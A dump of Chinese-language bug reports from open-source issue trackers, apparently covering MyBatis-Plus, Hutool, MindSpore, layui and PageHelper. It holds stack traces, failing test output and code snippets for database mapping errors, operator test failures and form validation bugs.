com.baomidou.mybatisplus.core.override.MybatisMapperMethod.execute(MybatisMapperMethod.java:60) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy$PlainMethodInvoker.invoke(MybatisMapperProxy.java:148) at com.baomidou.mybatisplus.core.override.MybatisMapperProxy.invoke(MybatisMapperProxy.java:89) at com.sun.proxy.$Proxy89.insert(Unknown Source) at cn.com.git.batch.mapper.test.DemoMapperInsertTest.saveTest(DemoMapperInsertTest.java:70) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:59) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:56) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.springframework.test.context.junit4.statements.RunBeforeTestExecutionCallbacks.evaluate(RunBeforeTestExecutionCallbacks.java:74) at org.springframework.test.context.junit4.statements.RunAfterTestExecutionCallbacks.evaluate(RunAfterTestExecutionCallbacks.java:84) at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:75) at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:86) at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:84) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:366) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:251) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) at org.junit.runners.ParentRunner$4.run(ParentRunner.java:331) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:79) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:329) at org.junit.runners.ParentRunner.access$100(ParentRunner.java:66) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:293) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner$3.evaluate(ParentRunner.java:306) at org.junit.runners.ParentRunner.run(ParentRunner.java:413) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) at org.eclipse.jdt.internal.junit4.runner.JUnit4TestReference.run(JUnit4TestReference.java:89) at org.eclipse.jdt.internal.junit.runner.TestExecution.run(TestExecution.java:41) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:541) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.runTests(RemoteTestRunner.java:763) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.run(RemoteTestRunner.java:463) at org.eclipse.jdt.internal.junit.runner.RemoteTestRunner.main(RemoteTestRunner.java:209) Caused by: org.apache.ibatis.type.TypeException: Could not set parameters for mapping: ParameterMapping{property='createTime', mode=IN, javaType=class java.time.LocalDateTime, jdbcType=null, numericScale=null, resultMapId='null', jdbcTypeName='null', expression='null'}. Cause: org.apache.ibatis.type.TypeException: Error setting non null for parameter #5:缓存问题 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: java.sql.SQLException: 无效的列类型 at com.baomidou.mybatisplus.core.MybatisParameterHandler.setParameters(MybatisParameterHandler.java:215) at org.apache.ibatis.executor.statement.PreparedStatementHandler.parameterize(PreparedStatementHandler.java:94) at org.apache.ibatis.executor.statement.RoutingStatementHandler.parameterize(RoutingStatementHandler.java:64) at com.baomidou.mybatisplus.core.executor.MybatisSimpleExecutor.prepareStatement(MybatisSimpleExecutor.java:99) at com.baomidou.mybatisplus.core.executor.MybatisSimpleExecutor.doUpdate(MybatisSimpleExecutor.java:55) at org.apache.ibatis.executor.BaseExecutor.update(BaseExecutor.java:117) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:197) at org.apache.ibatis.session.defaults.DefaultSqlSession.insert(DefaultSqlSession.java:184) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(Unknown Source) at sun.reflect.DelegatingMethodAccessorImpl.invoke(Unknown Source) at java.lang.reflect.Method.invoke(Unknown Source) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:426) ... 39 more Caused by: org.apache.ibatis.type.TypeException: Error setting non null for parameter #5:缓存问题 with JdbcType null . Try setting a different JdbcType for this parameter or a different configuration property. Cause: java.sql.SQLException: 无效的列类型 at org.apache.ibatis.type.BaseTypeHandler.setParameter(BaseTypeHandler.java:75) at com.baomidou.mybatisplus.core.MybatisParameterHandler.setParameters(MybatisParameterHandler.java:213) ... 51 more   <code>: //@TableField(""COST"") @TableField(fill = FieldFill.INSERT) private BigDecimal cost; @Override public void insertFill(MetaObject metaObject) { log.info(""start insert fill ....""); Object createType = getFieldValByName(""createTime"", metaObject);//mybatis-plus版本2.0.9+ if (createType == null) { setFieldValByName(""createTime"", LocalDateTime.now(), metaObject);//mybatis-plus版本2.0.9+ } this.strictInsertFill(metaObject, ""operator"", String.class, ""Jetty""); this.strictInsertFill(metaObject, ""major"", String.class, ""3442""); this.strictInsertFill(metaObject, ""cost"", BigDecimal.class, new BigDecimal(444.55)); }"
ArrayUtil.setOrAppend()传入空数组时，抛出异常,"JDK版本： openjdk_8_261 hutool版本： 6.0.0   <code>: public static void main(String[] args) { String[] arr = new String[0]; String[] newArr = ArrayUtil.setOrAppend(arr, 0, ""Good"");// ClassCastException System.out.println(Arrays.toString(newArr)); }"
[CT][MS][Trace]Not support TraceGrad at cpu and forward result incorrect,"1.cpu上不支持TraceGrad 2.正向测试结果不正确，对标失败 / 硬件环境: /device ascend/CPU/ : -- MindSpore version :master， <em>commit_id</em>_ = ''[sha1]:c6b826ae,[branch]:(HEAD-&gt;master,origin/master,origin/HEAD)'' -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph cpu上执行测试用例 用例执行通过， 对标通过 反向算子不支持   <code>: def test_trace_input13x34_fp32(): input_x = Tensor(np.random.randn(13, 34).astype(np.float32), dtype=mstype.float32) fact = TraceMock(inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() def test_trace_input_17x32_fp64(): input_x = Tensor(np.random.randn(17, 32).astype(np.float64), dtype=mstype.float64) fact = TraceMock(inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() def test_trace_input13x34_fp32(): input_x = Tensor(np.random.randn(13, 34).astype(np.float32), dtype=mstype.float32) fact = TraceMock(inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() E RuntimeError: Unsupported op [TraceGrad] on CPU, Please confirm whether the device target setting is correct, or refer to 'mindspore.ops' at https://www.mindspore.cn to query the operator support list. E The function call stack: E In file /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/_grad_experimental/grad_math_ops.py(599)/ dx = input_grad(dout, cast(to_array(shape), mstype.int64))/ E Corresponding forward node candidate: E - In file /home/cao_test/MindSporeTest/share/ops/primitive/trace_ops.py(20)/ return self.trace(input_x)/ E In file /home/cao_test/MindSporeTest/share/grad.py(20)/ return self.grad(self.network, self.params)(*in puts)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:243 SetOperatorInfo def test_trace_input_17x32_fp64(): input_x = Tensor(np.random.randn(17, 32).astype(np.float64), dtype=mstype.float64) fact = TraceMock(inputs=[input_x]) fact.forward_cmp() &gt; fact.grad_cmp() E RuntimeError: Unsupported op [TraceGrad] on CPU, Please confirm whether the device target setting is correct, or refer to 'mindspore.ops' at https://www.mindspore.cn to query the operator support list. E The function call stack: E In file /root/miniconda3/envs/op3.7/lib/python3.7/site-packages/mindspore/ops/_grad_experimental/grad_math_ops.py(599)/ dx = input_grad(dout, cast(to_array(shape), mstype.int64))/ E Corresponding forward node candidate: E - In file /home/cao_test/MindSporeTest/share/ops/primitive/trace_ops.py(20)/ return self.trace(input_x)/ E In file /home/cao_test/MindSporeTest/share/grad.py(20)/ return self.grad(self.network, self.params)(*inputs)/ E E ---------------------------------------------------- E - C++ Call Stack: (For framework developers) E ---------------------------------------------------- E mindspore/ccsrc/plugin/device/cpu/hal/hardware/cpu_device_context.cc:243 SetOperatorInfo"
空指针异常,某些方法不想分页 直接报空指针异常   <code>: return uUserMapper.selectByPrimaryKey(1L); Caused by: java.lang.NullPointerException at com.github.pagehelper.PageInterceptor.intercept(PageInterceptor.java:146) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy27.query(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.selectList(DefaultSqlSession.java:120)
[MS][310P]open device 0 failed,": /device ascend : -- MindSpore version : commit_id__ = ''[sha1]:9ed9f210,[branch]:(HEAD,origin/master,origin/HEAD,master) -- Python version : -- OS platform and distribution : -- GCC/Compiler version : Test_ms_ctpn_icdar2013_infer_ascend_mindir_310_0001 install cann pkg install mindspore start infer ctpn infer failed infer success 310P环境调用卡失败   <code>: [INFO] ME(5325,7fc7c44e9dc0,main):2021-11-26-23:41:35.588.837 [mindspore/ccsrc/cxx_api/graph/acl/acl_env_guard.cc:56] GetAclEnv] Acl init success [ERROR] TDT(5325,main):2021-11-26-23:42:00.385.528 [log.cpp:136]tsd client wait response fail, device response code[1]. load aicpu ops package failed, device[0], host pid[5325], error stack: Check head tag failed,[package_worker.cpp:426:VerifyAicpuPackage]1546 Msg: Tsdaemon start fail Verify Aicpu package failed, srcPath[/home/HwHiAiUser/aicpu_kernels/vf0_5325_Ascend710-aicpu_syskernels.tar.gz].,[package_worker.cpp:451:DecompressionAicpuPackage]1546 Msg: Tsdaemon start fail Decompression AicpuPackage[/home/HwHiAiUser/aicpu_kernels/vf0_5325_Ascend710-aicpu_syskernels.tar.gz] failed,[package_worker.cpp:169:LoadAICPUPackageForProcessMode]1546 Msg: Tsdaemon start fail Load aicpu package path[/home/HwHiAiUser/hdcd/device0/] file[5325_Ascend710-aicpu_syskernels.tar.gz] failed,[inotify_watcher.cpp:197:HandleEvent]1546 Msg: internal error [TSDaemon] checksum aicpu package failed,[tsd_common.cpp:164:StartSubProcess]14591 Msg: internal error [TSDaemon] load aicpu ops package failed, device[0], host pid[5325],[tsd_comm [ERROR] GE(5325,main):2021-11-26-23:42:00.385.598 [error_manager.cc:75]5325 FormatErrorMessage: [Check][Param] FormatErrorMessage failed, ret:-1, pattern:%s [ERROR] TDT(5325,main):2021-11-26-23:42:00.385.626 [log.cpp:136]Wait open response from device failed.,[process_mode_manager.cpp:79:Open]5325 Msg: tsd client open failed [ERROR] TDT(5325,main):2021-11-26-23:42:00.385.639 [log.cpp:136]TsdOpen failed, deviceId[0].,[tsd_client.cpp:29:TsdOpen]5325 Msg: tsd client open failed [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.758 [runtime.cc:1257]5325 startAicpuExecutor:TsdOpen failed. devId=0, tdt error=18100257 [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.839 [runtime.cc:1622]5325 DeviceRetain:Start aicpu executor failed, retCode=0x7020009 devId=0 [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.865 [runtime.cc:1486]5325 PrimaryContextRetain:Check param failed, dev can not be NULL! [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.882 [runtime.cc:1513]5325 PrimaryContextRetain:Check param failed, ctx can not be NULL! [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.897 [api_impl.cc:1135]5325 NewDevice:Check param failed, context can not be null. [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.915 [api_impl.cc:1156]5325 SetDevice:new device failed, retCode=0x7010006 [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.931 [logger.cc:548]5325 SetDevice:Set device failed, device_id=0, deviceMode=0. [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.966 [api_c.cc:1167]5325 rtSetDevice:ErrCode=507033, desc=[error device retain], InnerCode=0x7010006 [ERROR] RUNTIME(5325,main):2021-11-26-23:42:00.385.978 [error_message_manage.cc:39]5325 ReportFuncErrorReason:rtSetDevice execute failed, reason=[error device retain] [ERROR] ASCENDCL(5325,main):2021-11-26-23:42:00.386.000 [device.cpp:66]5325 aclrtSetDevice: open device 0 failed, runtime result = 507033. [ERROR] ME(5325,7fc7c44e9dc0,main):2021-11-26-23:42:00.386.059 [mindspore/ccsrc/cxx_api/graph/acl/acl_graph_impl.cc:102] InitEnv] Acl open device 0 failed [ERROR] ME(5325,7fc7c44e9dc0,main):2021-11-26-23:42:00.386.096 [mindspore/ccsrc/cxx_api/graph/acl/acl_graph_impl.cc:183] Load] InitEnv failed. [ERROR] ME(5325,7fc7c44e9dc0,main):2021-11-26-23:42:00.386.111 [mindspore/ccsrc/cxx_api/model/acl/acl_model.cc:83] Build] Load failed. ERROR: Build failed."
from表单校验问题,"版本：2.5.6 描述： 单选框和多选框必填校验失效 多选框表单取得的值不全 问题产生： 在使用layui下面的form模块时偶然又发现了这两个问题,之前也没见人提过以为这个不是什么bug就没有提。 我在一个layui表单里面创建了单选框和多选框,并将它们的每一项添加上lay-verify=""required""这样的必填项校验。 最开始我在多选框一个选项都没有选中时点击表单提交按钮,页面并没有提示错误,但是结果里面没有多选框的结果; 然后我手动的将单选框的每一项的设置为未选中,结果提交时也是没有提示错误,结果里面没有单选框的结果。 最后我将多选框全部选上,最后的结果是它只给我返回的多选项的最后一项。我觉得这个并不正常。 问题截图: 没有选择多选框点击提交按钮：没有提示,获取的结果没有多选项 现在我暂时将form里面的检验方法复制了出来，在检验前手动添加了对于单选框和多选框的特殊处理 如果这个确实有问题,希望官方可以改一下。   <code>: let verifys = []; const defaultText = '请完成表单!'; // 获取校验规则 if (othis.attr(constant.LAYUI_VERIFY)) verifys = othis.attr(constant.LAYUI_VERIFY).split(""|""); // 单选框和多选框的非空校验 const checkflag = (""radio"" === item.type || ""checkbox"" === item.type) &amp;&amp; verifys.length &gt; 0 &amp;&amp; verifys[0] == ""required""; if(checkflag){ let index = 0; parent.find('[name=""' + item.name + '""]').each(function () { if ($(this).get(0).checked === true) index++; }); if (""checkbox"" === item.type &amp;&amp; index &gt; 0) return true; if (""radio"" === item.type &amp;&amp; index === 1) return true; layui.layer.msg(othis.attr(constant.LAYUI_VERIFY_TEXT) || defaultText, { icon: 5 }); return false; }"
配置多个插件时，变更数据时报错,"当前使用版本 3.0.7.1 同时配置分页插件和分析插件时，增删改出错 在mybatis-plus-sample-execution-analysis的demo中，配置文件中加入分页插件，再运行即可重现   <code>: @Configuration public class MybatisPlusConfig { /** * 分页插件 */ @Bean public PaginationInterceptor paginationInterceptor() { return new PaginationInterceptor(); } @Bean public SqlExplainInterceptor sqlExplainInterceptor(){ SqlExplainInterceptor sqlExplainInterceptor = new SqlExplainInterceptor(); List&lt;ISqlParser&gt; sqlParserList = new ArrayList&lt;&gt;(); sqlParserList.add(new BlockAttackSqlParser()); sqlExplainInterceptor.setSqlParserList(sqlParserList); return sqlExplainInterceptor; } } Creating a new SqlSession SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@32118208] was not registered for synchronization because synchronization is not active JDBC Connection [HikariProxyConnection@571251299 wrapping conn0: url=jdbc:h2:mem:test user=ROOT] will not be managed by Spring ==&gt; Preparing: SELECT ID,NAME,AGE,fill_field FROM student ==&gt; Parameters: &lt;== Total: 0 Closing non transactional SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@32118208] Creating a new SqlSession SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@50b0afd7] was not registered for synchronization because synchronization is not active Closing non transactional SqlSession [org.apache.ibatis.session.defaults.DefaultSqlSession@50b0afd7] org.mybatis.spring.MyBatisSystemException: nested exception is org.apache.ibatis.reflection.ReflectionException: There is no getter for property named 'delegate' in 'class com.sun.proxy.$Proxy74' at org.mybatis.spring.MyBatisExceptionTranslator.translateExceptionIfPossible(MyBatisExceptionTranslator.java:77) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:446) at com.sun.proxy.$Proxy55.delete(Unknown Source) at org.mybatis.spring.SqlSessionTemplate.delete(SqlSessionTemplate.java:310) at com.baomidou.mybatisplus.core.override.PageMapperMethod.execute(PageMapperMethod.java:78) at com.baomidou.mybatisplus.core.override.PageMapperProxy.invoke(PageMapperProxy.java:64) at com.sun.proxy.$Proxy61.deleteById(Unknown Source) at com.baomidou.samples.execution.ExecutionTest.test(ExecutionTest.java:34) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.junit.runners.model.FrameworkMethod$1.runReflectiveCall(FrameworkMethod.java:50) at org.junit.internal.runners.model.ReflectiveCallable.run(ReflectiveCallable.java:12) at org.junit.runners.model.FrameworkMethod.invokeExplosively(FrameworkMethod.java:47) at org.junit.internal.runners.statements.InvokeMethod.evaluate(InvokeMethod.java:17) at org.springframework.test.context.junit4.statements.RunBeforeTestExecutionCallbacks.evaluate(RunBeforeTestExecutionCallbacks.java:74) at org.springframework.test.context.junit4.statements.RunAfterTestExecutionCallbacks.evaluate(RunAfterTestExecutionCallbacks.java:84) at org.springframework.test.context.junit4.statements.RunBeforeTestMethodCallbacks.evaluate(RunBeforeTestMethodCallbacks.java:75) at org.springframework.test.context.junit4.statements.RunAfterTestMethodCallbacks.evaluate(RunAfterTestMethodCallbacks.java:86) at org.springframework.test.context.junit4.statements.SpringRepeat.evaluate(SpringRepeat.java:84) at org.junit.runners.ParentRunner.runLeaf(ParentRunner.java:325) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:251) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.runChild(SpringJUnit4ClassRunner.java:97) at org.junit.runners.ParentRunner$3.run(ParentRunner.java:290) at org.junit.runners.ParentRunner$1.schedule(ParentRunner.java:71) at org.junit.runners.ParentRunner.runChildren(ParentRunner.java:288) at org.junit.runners.ParentRunner.access$000(ParentRunner.java:58) at org.junit.runners.ParentRunner$2.evaluate(ParentRunner.java:268) at org.springframework.test.context.junit4.statements.RunBeforeTestClassCallbacks.evaluate(RunBeforeTestClassCallbacks.java:61) at org.springframework.test.context.junit4.statements.RunAfterTestClassCallbacks.evaluate(RunAfterTestClassCallbacks.java:70) at org.junit.runners.ParentRunner.run(ParentRunner.java:363) at org.springframework.test.context.junit4.SpringJUnit4ClassRunner.run(SpringJUnit4ClassRunner.java:190) at org.junit.runner.JUnitCore.run(JUnitCore.java:137) at com.intellij.junit4.JUnit4IdeaTestRunner.startRunnerWithArgs(JUnit4IdeaTestRunner.java:68) at com.intellij.rt.execution.junit.IdeaTestRunner$Repeater.startRunnerWithArgs(IdeaTestRunner.java:47) at com.intellij.rt.execution.junit.JUnitStarter.prepareStreamsAndStart(JUnitStarter.java:242) at com.intellij.rt.execution.junit.JUnitStarter.main(JUnitStarter.java:70) Caused by: org.apache.ibatis.reflection.ReflectionException: There is no getter for property named 'delegate' in 'class com.sun.proxy.$Proxy74' at org.apache.ibatis.reflection.Reflector.getGetInvoker(Reflector.java:419) at org.apache.ibatis.reflection.MetaClass.getGetInvoker(MetaClass.java:164) at org.apache.ibatis.reflection.wrapper.BeanWrapper.getBeanProperty(BeanWrapper.java:162) at org.apache.ibatis.reflection.wrapper.BeanWrapper.get(BeanWrapper.java:49) at org.apache.ibatis.reflection.MetaObject.getValue(MetaObject.java:122) at org.apache.ibatis.reflection.MetaObject.metaObjectForProperty(MetaObject.java:145) at org.apache.ibatis.reflection.MetaObject.getValue(MetaObject.java:115) at com.baomidou.mybatisplus.core.parser.SqlParserHelper.getMappedStatement(SqlParserHelper.java:83) at com.baomidou.mybatisplus.core.parser.SqlParserHelper.getSqlParserInfo(SqlParserHelper.java:71) at com.baomidou.mybatisplus.extension.handlers.AbstractSqlParserHandler.sqlParser(AbstractSqlParserHandler.java:56) at com.baomidou.mybatisplus.extension.plugins.SqlExplainInterceptor.intercept(SqlExplainInterceptor.java:64) at org.apache.ibatis.plugin.Plugin.invoke(Plugin.java:61) at com.sun.proxy.$Proxy73.update(Unknown Source) at org.apache.ibatis.session.defaults.DefaultSqlSession.update(DefaultSqlSession.java:198) at org.apache.ibatis.session.defaults.DefaultSqlSession.delete(DefaultSqlSession.java:213) at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method) at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62) at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43) at java.lang.reflect.Method.invoke(Method.java:498) at org.mybatis.spring.SqlSessionTemplate$SqlSessionInterceptor.invoke(SqlSessionTemplate.java:433) ... 36 more 2019-01-25 17:38:28.367 INFO 19544 --- [ Thread-3] com.zaxxer.hikari.HikariDataSource : HikariPool-1 - Shutdown initiated..."
[CT][MS][Remainder] 当输入x为number或bool时，测试用例对比失败,"1，输入支持Tensor, numbers.Number, bool，但当第一个输入为number或bool时， CPU、GPU、Ascend后端，都执行失败 2， 在三个后端，Graph模式下，当x输入为tensor，y为False时，报错 在三个后端，PyNative模式下，当x输入为tensor，y为False时，可以正常通过 在三个后端，Graph模式下，当x输入为tensor，y为True时，可以正常通过 在三个后端，PyNative模式下，当x输入为tensor，y为True时，可以正常通过 / 硬件环境: /device ascend/GPU/CPU/kirin/等其他芯片 : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph   <code>: def test_remainder_input_x1_number_x2_tensor(): input_x1 = 56 input_x2 = Tensor(np.random.randn(8, 9, 6, 7), dtype=mstype.float32) fact = RemainderMock(inputs=[input_x1, input_x2]) fact.forward_cmp() &gt; fact.grad_cmp() test_f_remainder.py:192: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/remainder_ops.py:107: in grad_cmp allclose_nparray(torch, ms[0], self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(-30.162415, dtype=float32) data_me = array([[[[-1.81063599e+02, 3.03917351e+01, 4.67129822e+01, ..., 5.32877617e+01, 7.34821777e+01, 2.85502...160843e+01, 2.25774551e+02, ..., -9.60759125e+01, 2.54389076e+01, -2.32847080e+01]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): &gt; assert data_expected.shape == data_me.shape E AssertionError def test_remainder_input_x1_bool_false_x2_tensor(): input_x1 = False input_x2 = Tensor(np.random.randn(8, 9, 6, 7), dtype=mstype.float32) fact = RemainderMock(inputs=[input_x1, input_x2]) fact.forward_cmp() &gt; fact.grad_cmp() test_f_remainder.py:177: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/remainder_ops.py:107: in grad_cmp allclose_nparray(torch, ms[0], self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(21.683586, dtype=float32) data_me = array([[[[-0., 0., -0., ..., -0., 0., -0.], [-0., 0., -0., ..., -0., -0., -0.], [-0., -0., 0., ....0., 0.], [-0., 0., 0., ..., 0., 0., 0.], [ 0., 0., -0., ..., 0., 0., -0.]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): &gt; assert data_expected.shape == data_me.shape E AssertionError def test_remainder_input_x1_bool_true_x2_tensor(): input_x1 = True input_x2 = Tensor(np.random.randn(8, 9, 6, 7), dtype=mstype.float32) fact = RemainderMock(inputs=[input_x1, input_x2]) fact.forward_cmp() &gt; fact.grad_cmp() test_f_remainder.py:162: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/remainder_ops.py:107: in grad_cmp allclose_nparray(torch, ms[0], self.loss, self.loss) ../share/utils.py:31: in allclose_nparray _count_unequal_element(data_expected, data_me, rtol, atol) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array(13.291663, dtype=float32) data_me = array([[[[-0.00000000e+00, 5.28046799e+01, -0.00000000e+00, ..., -2.22864762e-01, -6.35316658e+00, 4.77624...619787e-01, 1.95905743e+01, ..., -4.25780869e+01, -1.70096350e+00, -6.19150519e-01]]]], dtype=float32) rtol = 0.0001, atol = 0.0001 def _count_unequal_element(data_expected, data_me, rtol, atol): &gt; assert data_expected.shape == data_me.shape E AssertionError def test_remainder_input_x1_tensor_x2_bool_false(): input_x = Tensor(np.random.randn(8, 3), dtype=mstype.float32) input_y = False fact = RemainderMock(inputs=[input_x, input_y]) &gt; fact.forward_cmp() test_f_remainder.py:146: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../share/ops/primitive/remainder_ops.py:70: in forward_cmp allclose_nparray(out_tf, out_mindspore, self.loss, self.loss) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ data_expected = array([[nan, nan, nan], [nan, nan, nan], [nan, nan, nan], [nan, nan, nan], [nan, nan, nan], [nan, nan, nan], [nan, nan, nan], [nan, nan, nan]], dtype=float32) data_me = array([[ 0.54845685, 0.20794605, 0.75844765], [-0.2803889 , 0.15213557, -1.0259326 ], [ 1.0646441 , -...21609], [-1.7959645 , -1.4530466 , 2.0478027 ], [-1.1274401 , -0.41369998, -0.7399858 ]], dtype=float32) rtol = 0.0001, atol = 0.0001, equal_nan = True def allclose_nparray(data_expected, data_me, rtol, atol, equal_nan=True): if np.any(np.isnan(data_expected)) or np.any(np.isnan(data_me)): &gt; assert np.allclose(data_expected, data_me, rtol, atol, equal_nan=equal_nan) E AssertionError"
输入等于输出的mlp的模型save问题,Check out this page to find out much more about markdown.   <code>: how do you run your code? what system do you use? Are you using GPU or not?
逻辑删除导致sql的bug,"下面是出问题的sql: 出现了两次where   <code>: SELECT id,`name`,`rank`,image_url AS imageUrl, award_description AS awardDescription, experience_value AS experienceValue, create_time AS createTime,modify_time AS modifyTime, delete_flag AS deleteFlag FROM rule_teacher_rank WHERE delete_flag=0 WHERE (rank = ?)"
